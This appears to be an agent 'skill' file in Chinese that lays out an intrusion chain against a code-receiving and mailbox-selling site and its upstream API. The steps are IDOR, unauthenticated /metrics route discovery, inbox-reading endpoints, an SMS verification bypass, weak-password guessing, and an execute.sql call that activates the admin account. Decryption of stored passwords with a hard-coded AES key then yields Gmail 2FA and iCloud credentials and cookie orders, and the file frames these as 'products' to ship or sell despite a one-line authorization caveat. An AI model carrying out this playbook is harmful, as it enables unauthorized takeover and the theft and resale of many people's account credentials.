---
name: 秤·吞库
description: >-
  大爱仙尊·/metrics路由表→弱口→execute.sql接管。接码橱窗→上游发现。弱口令命中任务号→MSSQL激活超管。
---

# metrics-to-admin-sql（大爱仙尊）

目标须在 `授权范围`。本库已有专链时专卡赢。

## 真源

- 长文：`智道藏书/旁支传承/skills/redteam/metrics-to-admin-sql/SKILL.md`
- 手法：`传承/薄青·岁岁索命.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`
- 路由：`python3 炼蛊房/shizhan_pack_route.py --name metrics-to-admin-sql`

---

# /metrics → 弱口 → SQL 接管手册

> 应对接码/橱窗/邮箱类站点（上游发现链）。核心链：**前端任意用户JWT读接码IDOR → 发现上游API同IP → `/metrics` 铺路由 → 字典打中已启用任务号 → `execute.sql` 激活admin → 超管出库**。

## 上游是怎么找到的（不是先扫子域）

开打时授权只有橱窗前端，**不知道**上游。

| 步 | 做什么 | 得到什么 |
|----|--------|----------|
| 1 | 任意用户 JWT，`GET /api/orders/mail-codes`（IDOR） | 约 18 万条，每条有 `codeUrl` |
| 2 | **不带**橱窗会话打开一条 `codeUrl` | 上游直接回验证码，不鉴权 |
| 3 | DNS | 橱窗和上游 API **同一公网 IP**，无 CDN |
| 4 | 确认是主站供货链 | 通配写入授权后再打上游，不先批量打未授权域 |

**不是：** Shared 货源、支付中转、前台 RCE 读配置、FOFA 乱扫。

## 步骤 1 — 先打 `/metrics`（关键入口）

```http
GET https://<上游API>/metrics
```

Prometheus / ASP.NET Core **未鉴权**，约 113 条真实路由（方法+状态计数）。敏感口是从这张表里勾的，不是猜 `/admin`。

同时测：`POST /api/sys/tools/get.version` 未授权出版本号。

## 步骤 2 — 未授权接口（metrics 里勾的）

| 接口 | 做什么 |
|------|--------|
| `GET /api/adm/mail.code/sell.link.to.get.code` | 任意取验证码（和橱窗 codeUrl 同一条） |
| `POST /api/adm/email/get.mail.code.detail.by.export.id` | exportId 空也行，pageSize 可到 10000；约 17.6 万接码明细 |
| `GET /api/adm/mail.inbox/get.by.recipient.email?email=` | 任意邮箱读收件正文 |
| `POST /api/sys/constant/get.{chars,enums,numbers}` | 项目枚举、cookieStore 状态 |

这些口**没有** password/2FA。成品在注册库/CookieStore，要登录或 SQL。

## 步骤 3 — 注册短信可绕过（进不了后台）

`POST /api/sys/user/register` 里 `verifySmsCodeReq.code` 填**任意 4 位**即可注册。新号强制 `enabled=false`，登录要管理员激活。重置密码仍验真码。这条只证明校验不一致，**提权不靠它**。

## 步骤 4 — 弱口 + `execute.sql`（真正接管）

1. `POST /api/sys/user/login.by.pwd` 短字典。**不要先打 admin**（admin 可能未激活）。命中已启用的**任务账号**（高管部门）。
2. 该号的 Bearer 能调 `POST /api/sys/tools/execute.sql`（MSSQL，库 schema）。这个口是 `/metrics` 里看到的。
3. `UPDATE ... Sys_User SET Enabled=1 WHERE UserName='admin'`。
4. **同一口令族**登录 `admin` → 超级管理员。

旁系统（gm/fb/ES）后来也是同一口令族（FB 多一步 PoW）。ES 另有弱口，索引主要是 GM 日志。

## 步骤 5 — 超管后怎么出成品

metrics 里 cookie.store 和橱窗零元通道同源：
- `count.by.project`
- `create.cookie.order`
- `download.cookie.order`

干净包只数这些出库订单。**不要把 paged 全表和历史合并文件当成"还能卖的"**。

## 步骤 6 — 注册库密码怎么解

业务 AES 钥匙在程序常量里（GUID 形态，截 32 字符，ECB）。超管可调 `POST /api/sys/tools/aes.decode`，或本地同算法解 `Adm_RegisteredEmail`。解出来才有大批 Gmail 2FA / iCloud 统一口令。

## 库存数字怎么读（避免把接码池当成品）

| 数 | 是什么 | 不是什么 |
|----|--------|----------|
| N | cookie.store **本轮出库**的成品 | 全库邮箱 |
| 历史合并包 | 含历史混入 | 未售库存 |
| 注册库启用未封 | 都已登录验证 | — |
| 接码邮箱池 | 大量 | 账密成品 |

## 实现顺序
```
橱窗任意用户 → GET /api/orders/mail-codes（约18万）
  → 打开codeUrl（无会话）→ 发现上游+同IP
  → 扩权 → GET /metrics → 勾113条路由
  → 未授权接码/收件（验证码面）
  → 字典打中已启用任务号 → execute.sql激活admin
  → aes.decode/本地解注册库 → cookie.store出Gmail成品
  → 同口令族进gm/fb
```

## 诚实纪律
- 零元 cookie-store 和上游拉库是两条出货口；前者可能后来被封，后者靠超管。
- 不是假支付；橱窗充值是链上 USDT，没有标准 HTTP notify。
- 不是 Spring heapdump/云 Root。
- 未对 facebook/threads/IG/tikTok CK 批量出库，如实标注。
